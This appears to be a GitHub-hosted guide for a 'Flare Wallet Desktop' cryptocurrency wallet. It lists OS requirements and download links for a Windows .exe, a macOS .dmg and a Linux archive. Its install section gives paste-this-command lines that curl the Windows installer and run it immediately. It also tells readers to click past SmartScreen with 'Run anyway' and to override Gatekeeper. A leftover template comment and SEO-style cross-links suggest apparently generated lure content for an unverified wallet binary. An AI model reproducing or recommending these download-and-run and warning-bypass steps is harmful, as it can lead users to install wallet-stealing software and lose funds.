![Flare Wallet](assets/banner-article.png)

# Flare Wallet System Requirements: Windows, macOS and Linux

Three installers, three floors, and what each one actually rules out.

## Downloads - v1.3.02

<p align="center"><a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`flare-wallet-desktop-windows-v1.3.02.exe`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`flare-wallet-desktop-macos-v1.3.02.dmg`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`flare-wallet-desktop-linux-v1.3.02.zip`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip) |

All three files are attached to the [current Flare Wallet release](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02); the requirements below are the ones that decide whether your machine can run it.

> Below the floor, the installer is not slow or unstable. It simply does not run, and no setting on your machine changes that.

Flare Wallet Desktop ships for three platforms, and each has a minimum version it was built against: Windows 10 build 1909 or later on 64-bit, macOS 12 or later, and Linux on x64 with Ubuntu 20.04 or a comparable distribution. Those are the supported floors, not guesses at what might work.

<!-- ARTICLE-BODY-BEGIN -->

## The requirements, in one table

| Platform | Minimum OS | Architecture | Package |
| --- | --- | --- | --- |
| Windows | 10, build 1909 or later | 64-bit (x64) | `.exe` installer |
| macOS | 12 (Monterey) or later | Intel or Apple silicon | `.dmg` disk image |
| Linux | Ubuntu 20.04 or equivalent | x64 | `.zip` archive |

Two things are deliberately missing from that table: a RAM figure and a disk figure. This project does not publish either, so this page will not invent them. Treat the numbers any guide quotes as that guide's estimate.

## Windows: build 1909 is the real floor

"Windows 10" is not precise enough, because the build number matters. 1909 was the November 2019 update, and it is the oldest build the installer supports. A machine on 1809 or earlier is below the floor even though its Start menu says Windows 10.

The 64-bit requirement is the second half. The build is x64 only, so a 32-bit installation of Windows cannot run it, and there is no 32-bit installer to fall back on.

To check your build, press Windows key and R, type `winver`, and press Enter. The dialog names the version and the build number. If the build is above 1909, you are supported; if it is below, update Windows first.

## macOS: version 12 and the Apple silicon question

macOS 12 Monterey is the floor. Older releases lack the system frameworks the application is built against, and the disk image will not launch on them.

The release publishes a single `.dmg`, not a separate Apple silicon build. On an M-series Mac the same file is the one to install, and whether it runs natively or through Rosetta is something this page cannot state as a fact about the build. What the page can state is that no second macOS asset exists, so a page offering an "ARM version" is offering something this project did not publish.

Check your version under the Apple menu, About This Mac. The window names the macOS release and the chip.

## Linux: x64 and a 2020-era distribution

The Linux build targets x64 and distributions of roughly Ubuntu 20.04 vintage or newer, which in practice means a system with a reasonably current C library and the usual desktop libraries. A distribution from 2018 will often fail at launch rather than at download, which is why the version floor is worth reading before you extract anything.

It is distributed as a `.zip`, not as a `.deb`, `.rpm` or AppImage. Nothing in the release registers a package with your system, so installation means extracting an archive and running the executable inside it, and removal means deleting what you extracted.

Check both facts in one command: `uname -m` prints the architecture, and `lsb_release -d` prints the distribution and release.

## What the requirements do not cover

A supported operating system is necessary, not sufficient. Three things sit outside the version floor and cause most of the failures people report:

- **A damaged download.** A partial file fails to install on a fully supported machine. Compare the hash before concluding the OS is at fault.
- **A missing desktop library on Linux.** The archive assumes a working graphical session; a minimal server install has no display to draw into.
- **Permissions.** An account that cannot write to its own application directory will fail at first launch on any of the three platforms.

None of those are fixed by upgrading the OS, and none of them mean the release is broken.

## If your machine is below the floor

There is no compatibility mode, no older build published for legacy systems, and no 32-bit edition. The honest options are to update the operating system or to run the wallet on a machine that meets the requirement.

That answer is unsatisfying, and it is still better than an installer that fails halfway. For the download side of the process, including the three filenames and the hash check, read <a href="https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-download.md">download Flare Wallet</a>. If your machine qualifies but the app misbehaves after installation, the diagnostic order is in <a href="https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-update.md">keep Flare Wallet updated</a>, which starts with confirming the build you actually installed.

## FAQ

### What are the Flare Wallet Desktop system requirements?

Windows 10 build 1909 or later on 64-bit, macOS 12 or later, or Linux on x64 with Ubuntu 20.04 or an equivalent distribution. The current installers are attached to the <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02">current Flare Wallet release</a>.

### Does it run on Windows 7 or 8?

No. The floor is Windows 10 build 1909, and there is no legacy build published for older versions.

### Does it need a 32-bit installer?

No such installer exists. All three platforms are 64-bit, and the Windows and Linux builds are x64 only.

### How much RAM or disk space does it need?

This project does not publish either figure. The application is a single desktop program rather than a node that stores the chain, so it is not in the same class as a full validator, but any specific number quoted elsewhere is an estimate rather than a requirement.

### Will it run on a Chromebook or a tablet?

Not as a native application. The three supported platforms are the desktop operating systems above; anything else is outside what this release covers.

### Which file do I download for my system?

The `.exe` for Windows, the `.dmg` for macOS and the `.zip` for Linux. The filename encodes both platform and version, and the full list is in <a href="https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-download.md">download Flare Wallet</a>.

<!-- ARTICLE-BODY-END -->

## How to install Flare Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->

### Windows

Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe">flare-wallet-desktop-windows-v1.3.02.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS

Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg">flare-wallet-desktop-macos-v1.3.02.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux

The Linux asset is a ZIP archive; verify the hash, extract it, then run the executable inside.

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip">flare-wallet-desktop-linux-v1.3.02.zip</a>.
2. Verify it before extracting: `sha256sum flare-wallet-desktop-linux-v1.3.02.zip`.
3. Extract with your file manager or `unzip flare-wallet-desktop-linux-v1.3.02.zip`.
4. Make the extracted executable runnable if needed, then launch it.
<!-- INSTALL-END -->

## Related guides

[download Flare Wallet](https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-download.md) | [keep Flare Wallet updated](https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-update.md) | [Flare Wallet desktop app](https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-desktop-app.md) | [current release](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02)
